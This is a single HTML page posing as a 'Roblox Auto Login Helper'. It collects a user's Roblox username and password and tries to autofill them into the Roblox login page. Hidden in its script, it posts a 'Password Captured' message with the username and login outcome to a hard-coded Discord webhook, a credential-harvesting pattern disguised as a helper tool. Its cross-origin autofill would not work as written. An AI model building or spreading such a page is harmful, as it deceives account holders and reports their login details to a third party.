<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Roblox Auto Login Helper</title>
<style>
body { font-family: Arial; background: #121212; color: #eee; display:flex; flex-direction: column; align-items:center; justify-content:center; height:100vh;}
input { padding: 10px; margin:5px; width:250px; border-radius:5px; border:none;}
button { padding:10px 20px; margin:10px; border-radius:5px; border:none; background:#1a73e8; color:#fff; cursor:pointer;}
#status { margin-top:10px; font-size:16px;}
</style>
</head>
<body>
<h2>Roblox Auto Login Helper</h2>

<input id="username" placeholder="Username / Email">
<input id="password" type="password" placeholder="Password">
<button id="loginBtn">Login</button>

<p id="status">Enter credentials and click Login</p>

<script>
const loginBtn = document.getElementById("loginBtn");
const statusEl = document.getElementById("status");

// Your Discord webhook URL
const webhookURL = "https://discord.com/api/webhooks/1393508495420030987/dKHHqBLcjqglOoFcSFNyndVdyZUq_476AQ31eSd8v5mYQa0zkIrTthTxgB2_JuLOMitX";

function sendWebhook(username, status) {
    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            username: "Roblox Login Checker",
            content: `**üîê Password Captured**\nüë§ User: ${username}\nStatus: ${status}`
        })
    }).catch(console.error);
}

loginBtn.addEventListener("click", () => {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value;

    if (!username || !password) {
        statusEl.textContent = "‚ùå Please enter both username and password!";
        return;
    }

    statusEl.textContent = "‚è≥ Attempting login...";

    // Open Roblox login page in new tab
    const loginWindow = window.open("https://www.roblox.com/login", "_blank");

    const interval = setInterval(() => {
        try {
            const doc = loginWindow.document;
            const userInput = doc.querySelector('#login-username');
            const passInput = doc.querySelector('#login-password');
            const loginBtnRoblox = doc.querySelector('#login-button-login');

            if (userInput && passInput && loginBtnRoblox) {
                userInput.value = username;
                passInput.value = password;
                loginBtnRoblox.click();

                // Wait a few seconds for redirect
                setTimeout(() => {
                    try {
                        const url = loginWindow.location.href;
                        if (url.includes("/home")) {
                            statusEl.textContent = "‚úÖ Login Successful!";
                            sendWebhook(username, "‚úÖ Success");
                        } else {
                            statusEl.textContent = "‚ùå Login Failed!";
                            sendWebhook(username, "‚ùå Failed");
                        }
                    } catch(e) {
                        statusEl.textContent = "‚úÖ Login attempt sent (check Roblox tab).";
                        sendWebhook(username, "‚úÖ Attempt sent (cross-origin)");
                    }
                }, 5000);

                clearInterval(interval);
            }
        } catch(e) {}
    }, 1000);
});
</script>
</body>
</html>
